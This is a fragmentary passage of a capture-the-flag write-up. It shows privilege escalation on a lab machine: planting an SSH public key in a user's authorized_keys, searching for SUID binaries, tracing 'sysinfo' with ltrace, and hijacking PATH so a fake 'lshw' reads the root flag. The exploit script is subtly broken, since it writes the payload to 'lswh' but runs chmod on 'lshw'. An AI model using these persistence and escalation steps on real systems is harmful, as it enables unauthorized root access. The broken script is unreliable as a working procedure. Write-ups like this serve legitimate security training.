...
In order to have a better shell we put our SSH public key in `theseus`
authorized keys.

`echo 'ssh-rsa  kali@kali' >> ~/.ssh/authorized_keys`

That way we can connect using SSH and enumerate the box.
...
When looking at the SUID files we see that `sysinfo` is quit recent.
    ...
    :::text
    theseus@ubuntu:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; | grep -v snap
...
saw a call to `lshw` using a relative path.
    ...
    :::text
    theseus@ubuntu:~$ ltrace /bin/sysinfo
    _ZNSt8ios_base4InitC1Ev(0x563a9ad87131, 0xffff, 0x7ffe1eb20d58, 128)                                                                             = 0
    __cxa_atexit(0x7f39e7824a40, 0x563a9ad87131, 0x563a9ad87008, 6)                                                                                  = 0
    setuid(0)                                                                                                                                        = -1
    setgid(0)                                                                                                                                        = -1
    _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x563a9ad87020, 0x563a9ab858f8, -160, 0)                                                 = 0x563a9ad87020
    _ZNSolsEPFRSoS_E(0x563a9ad87020, 0x7f39e7894870, 0x563a9ad87020, 0x563a9ab8592d====================Hardware Info====================
    )                                                                 = 0x563a9ad87020
    _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffe1eb20c20, 0x563a9ab8592e, 0, 2880)                                               = 0x7ffe1eb20c30
    popen("lshw -short", "r")                                                                                                                        = 0x563a9c8f6280
...
So we simply exploit this `PATH` vulnerability and get the root flag.
    ...
    cd /tmp/ioio
    PATH=./:$PATH
    echo 'cat /root/root.txt' > lswh
    chmod +x lshw
    sysinfo

(The flag is in the first lines of the `sysinfo` output.)
